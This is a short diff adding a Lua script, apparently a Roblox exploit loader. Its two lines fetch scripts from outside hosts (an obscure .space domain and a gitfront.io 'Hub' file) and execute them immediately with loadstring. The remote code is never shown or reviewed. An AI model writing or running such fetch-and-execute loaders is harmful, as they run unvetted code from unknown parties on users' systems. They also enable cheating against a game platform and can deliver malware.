@@ -1,0 +1,5 @@
+-- Load and execute the first script
+loadstring(game:HttpGet("https://egorikusa.space/f9f0e7f9f818776a4f966fe4.lua", true))()
+
+-- Load and execute the second script
+loadstring(game:HttpGet('https://gitfront.io/r/ReQiuYTPL/wFUydaK74uGx/hub/raw/ReQiuYTPLHub.lua'))()
